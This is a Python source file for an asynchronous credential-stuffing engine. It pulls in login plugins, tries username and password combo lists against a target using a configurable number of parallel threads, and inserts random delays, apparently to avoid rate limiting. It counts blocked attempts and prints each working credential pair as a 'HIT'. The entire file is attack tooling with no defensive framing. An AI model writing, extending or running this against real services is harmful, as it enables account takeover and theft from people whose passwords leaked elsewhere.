import asyncio
import time
from typing import Optional, Dict, Any, Type, List
from dataclasses import dataclass

from .plugin_interface import BasePlugin, LoginResult, AuthResult


@dataclass
class AttackStats:
    attempted: int = 0
    successful: int = 0
    failed: int = 0
    blocked: int = 0
    start_time: Optional[float] = None
    
    @property
    def elapsed(self) -> float:
        if self.start_time is None:
            return 0
        return time.time() - self.start_time


class PluginRegistry:
    def __init__(self):
        self.plugins: Dict[str, Type[BasePlugin]] = {}
        
    def register(self, plugin_cls: Type[BasePlugin]):
        instance = plugin_cls()
        self.plugins[instance.name] = plugin_cls
        
    def get(self, name: str) -> Optional[Type[BasePlugin]]:
        return self.plugins.get(name)


class AttackEngine:
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.registry = PluginRegistry()
        self.stats = AttackStats()
        self._stop = asyncio.Event()
        self._lock = asyncio.Lock()
        
    def stop(self):
        self._stop.set()
        
    async def credential_stuffing(self, plugin_name: str, target: str,
                                 combos: List[tuple]) -> Dict[str, Any]:
        plugin_cls = self.registry.get(plugin_name)
        if not plugin_cls:
            raise ValueError(f"Unknown plugin: {plugin_name}")
            
        plugin = plugin_cls()
        self.stats = AttackStats(start_time=time.time())
        
        semaphore = asyncio.Semaphore(self.config.get("threads", 10))
        
        async def try_one(username: str, password: str):
            async with semaphore:
                if self._stop.is_set():
                    return
                    
                await asyncio.sleep(self._calculate_delay())
                
                try:
                    result = await plugin.login(username, password, session=target)
                    async with self._lock:
                        self.stats.attempted += 1
                        if result.is_success():
                            self.stats.successful += 1
                            print(f"[+] HIT: {username}:{password}")
                        elif result.is_failure():
                            self.stats.failed += 1
                        elif result.is_blocked():
                            self.stats.blocked += 1
                except Exception as e:
                    print(f"[-] Error: {e}")
        
        tasks = [try_one(u, p) for u, p in combos]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return {
            "attempted": self.stats.attempted,
            "successful": self.stats.successful,
            "failed": self.stats.failed,
            "elapsed": self.stats.elapsed
        }
    
    def _calculate_delay(self) -> float:
        import random
        base = self.config.get("delay_min", 0.5)
        max_delay = self.config.get("delay_max", 2.0)
        return random.uniform(base, max_delay)